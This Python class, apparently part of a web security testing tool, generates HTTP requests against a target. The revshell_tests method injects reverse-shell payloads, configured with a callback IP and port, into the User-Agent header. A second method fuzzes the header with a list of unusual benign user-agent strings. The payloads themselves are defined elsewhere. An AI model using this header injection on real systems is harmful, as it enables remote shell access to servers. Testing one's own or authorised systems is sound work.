from headers.static_values import *
from worker import *
from utils import *
import requests

class UserAgent():

    def __init__(self, destination):
        self.destination       = destination
        self.mime_types        = MimeTypes.get_mime_list()
        self.payloads          = Payloads.get_payload_list(Config.revshell_ip, Config.revshell_port)
        self.test_array        = []

    def revshell_tests(self):
        for payload in self.payloads:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = payload,
                    headers = {
                        "User-Agent" : payload
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def ua_fuzz_tests(self):
        ua_fuzz = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 7.0; SM-G950U1 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 Instagram 34.0.0.12.93 Android (24/7.0; 420dpi; 1080x2094; samsung; SM-G950U1; dreamqlteue; qcom; pt_BR; 94080607)",
            "Opera/9.80 (S60; SymbOS; Opera Mobi/SYB-1111151949; U; en-GB) Presto/2.9.201 Version/11.50",
            "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.124 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 4.4.2; SM-G900P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
            "YahooMailProxy; https://help.yahoo.com/kb/yahoo-mail-proxy-SLN28749.html",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 1.7; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
            "Domain Re-Animator Bot (http://domainreanimator.com) - support@domainreanimator.com",
            "W3C-checklink/3.6.2.3 libwww-perl/5.805",
            "Jigsaw/2.3.0 W3C_CSS_Validator_JFouffa/2.0 (See <http://validator.w3.org/services>)",
            "LogicMonitor SiteMonitor/1.0",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1) DejaClick/2.5.0.7",
            "SAMSUNG-GT-S3850/1.0 SHP/VPP/R5 Dolfin/2.0 NexPlayer/3.0 SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 OPN-B",
            "LG-P880/V10h-NOV-19-2012; LG-Player/NexPlayer4.0 for Android(stagefright alternative)",
            "NexPlayer 4.0 for Android( stagefright alternative )",
            "ElmediaPlayer Mozilla/5.0 AppleWebKit/533.20.25",
            "Mozilla/5.0 (Linux; U; fr-fr; KFOT Build/IML74K) AppleWebKit/535.19 (KHTML, like Gecko) Silk/3.14 Safari/535.19 Silk-Accelerated=true",
            "Mozilla/5.0 (Linux; U; Android 2.2.1; en-us; NOOK BNRV200 Build/ERD79 1.4.3) Apple WebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            "Mozilla/4.0 WebTV/2.6 (compatible; MSIE 4.0)",
            "Opera/9.80 (Linux armv7l; HbbTV/1.2.1 (; Philips; 42PFH560988; ; PhilipsTV; CE-HTML/1.0 NETTV/4.4.1 SmartTvA/3.0.0 Firmware/010.003.062.128 (PhilipsTV, 3.1.1,)en) ) Presto/2.12.407 Version/12.50",
            "Opera/9.80 (Linux mips; ) Presto/2.12.407 Version/12.51 MB97/0.0.34.15 (HITACHI, Mxl661LG32, wireless) VSTVB_MB97 SmartTvA/3.0.0",
            "HbbTV/1.1.1 (;Samsung;SmartTV2013;T-FXPDEUC-1102.2;;) WebKit"
        ]

        for ua in ua_fuzz:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = ua,
                    headers = {
                        "User-Agent" : ua
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def generate_tests(self):
        if Config.test_level >= Config.TEST_LEVEL_OPTIMAL:
            self.revshell_tests()
            self.ua_fuzz_tests()

    def get_tests(self):
        self.generate_tests()
        return self.test_array